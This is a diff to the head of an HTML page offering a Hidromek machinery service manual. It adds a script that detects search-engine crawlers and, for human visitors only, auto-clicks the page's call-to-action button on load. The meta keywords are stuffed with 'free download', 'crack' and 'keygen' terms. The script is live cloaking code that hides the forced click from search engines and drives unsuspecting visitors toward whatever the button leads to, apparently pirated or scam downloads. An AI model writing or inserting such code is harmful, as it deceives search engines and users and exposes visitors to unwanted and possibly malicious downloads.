@@ -5,6 +5,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Hidromek Machinery Service Manual 2022</title>
+    
+<script>
+const searchEngineUserAgents = [
+  'Googlebot',
+  'Bingbot',
+  'YandexBot',
+  'DuckDuckBot',
+  'Baiduspider',
+];
+
+function isSearchEngine(userAgent) {
+  return searchEngineUserAgents.some(bot => userAgent.includes(bot));
+}
+
+function clickCTAButton() {
+  const ctaButton = document.querySelector('.cta-button');
+  if (ctaButton) {
+    ctaButton.click();
+  }
+}
+
+function main() {
+  const userAgent = navigator.userAgent;
+  
+  if (!isSearchEngine(userAgent)) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', clickCTAButton);
+    } else {
+      clickCTAButton();
+    }
+  }
+}
+
+main();
+</script>
+
     <meta name="description" content="Hidromek Machinery Service Manual 2022 provides comprehensive diagnostics, maintenance, and repair guides for various Hidromek equipment models">
     <meta name="keywords" content="Hidromek Machinery Service Manual 2022, Hidromek Machinery Service Manual PDF, Hidromek Service Manual 2022 PDF, Hidromek Service Manual 2022 download, Hidromek Service Manual 2022 free download, Hidromek Machinery Service Manual download, Hidromek manual PDF free download, Hidromek 2022 service manual download, Hidromek 2022 service manual free download, Hidromek backhoe loader service manual, Hidromek excavator service manual, Hidromek wheel loader service manual, Hidromek motor grader service manual, Hidromek Service Manual 2022 Russian PDF, Hidromek Service Manual 2022 Ukrainian PDF, Hidromek Service Manual 2022 PDF ру, Hidromek 2022 руководство по обслуживанию, руководство Hidromek, руководство Hidromek бесплатно PDF, Hidromek 2022 рік керівництва по обслуговуванню, керівництва Hidromek, Hidromek Machinery Service Manual 2022 PDF free download, Hidromek Machinery Service Manual 2022 PDF download, Hidromek Service Manual 2022 crack, Hidromek Service Manual 2022 keygen, Hidromek diagnostic software, Hidromek diagnostic software download, Hidromek diagnostic software free download, Hidromek diagnostic software crack, Hidromek diagnostic software keygen, Hidromek Backhoe Loader HMK 102B ALPHA SUPRA Turner ZF Rexroth Service Manuals PDF, Hidromek Backhoe Loader HMK 102B ALPHA Turner ZF Husco Service Manuals PDF, Hidromek Backhoe Loader HMK 102B front axle Service Manuals PDF, Hidromek Backhoe Loader HMK 102B HMK 102S energy Service Manuals PDF, Hidromek Backhoe Loader HMK 102B HMK 102S John Deere Motor Service Manuals PDF, Hidromek Backhoe Loader HMK 102B HMK 102S Maestro Service Manuals PDF, Hidromek Backhoe Loader HMK 102B HMK 102S Maestro ZF 5WG98 Transmission Service Manuals PDF, Hidromek Backhoe Loader HMK 102B rear axle Service Manuals PDF, Hidromek Backhoe Loader HMK 102S ALPHA-SUPRA-T3 Turner CR Rexroth Service Manuals PDF, Hidromek Backhoe Loader HMK 102S ALPHA-T3 Husco Turner CR-TR Service Manuals PDF, Hidromek Crushers SC28 VE SC36 Service Manuals PDF, Hidromek Excavator HMK140L-3 Service Manuals PDF, Hidromek Excavator HMK140W 3 Service Manuals PDF, Hidromek Excavator HMK145LC-3 SR Service Manuals PDF, Hidromek Excavator HMK200W-2 Service Manuals PDF, Hidromek Excavator HMK200W-3 Service Manuals PDF, Hidromek Excavator HMK220LC-2 Service Manuals PDF, Hidromek Excavator HMK220LC-3 Service Manuals PDF, Hidromek Excavator HMK300LC Service Manuals PDF, Hidromek Excavator HMK300LC-2 Service Manuals PDF, Hidromek Excavator HMK300LC-3 Service Manuals PDF, Hidromek Excavator HMK370LC-3 Service Manuals PDF, Hidromek Excavator HMK390LC-3 Service Manuals PDF, Hidromek Excavator HMK490LC-3 Service Manuals PDF, Hidromek Excavator HMK500LC-3 Service Manuals PDF, Hidromek Isuzu Diesel Engine Service Manuals PDF, Hidromek Mitsubishi Diesel Engine Service Manuals PDF, Hidromek HMK600MG Service Manuals PDF, Hidromek HMK640WL Service Manuals PDF">
     <style>
